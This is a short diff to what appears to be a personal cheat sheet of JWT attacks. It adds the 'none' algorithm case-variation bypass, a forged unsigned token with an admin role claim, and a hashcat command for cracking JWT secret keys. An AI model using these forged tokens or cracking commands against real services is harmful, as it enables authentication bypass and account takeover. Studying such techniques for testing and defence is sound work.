@@ -11,6 +11,7 @@ in JWT
   "alg": "none"
 }
 ```
+none or NoNe or noNE ...etc
 Don't send the SIGNATURE send like this :
 
 `eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.`
@@ -36,21 +37,8 @@ xss ngrpk paylode
 ```
 
 ---
-JWT attacks Accepting tokens with no signature
+JWT Brute-forcing secret keys using hashcat
 
-```json
-{
-    "alg": "HS256",
-    "typ": "JWT"
-}
+```bash
+hashcat -a 0 -m 16500 <jwt> <wordlist>
 ```
-
-to :
-
-```json
-{
-    "alg": "HS256",
-    "typ": "none"
-}
-```
-none or NoNe or noNE ...etc
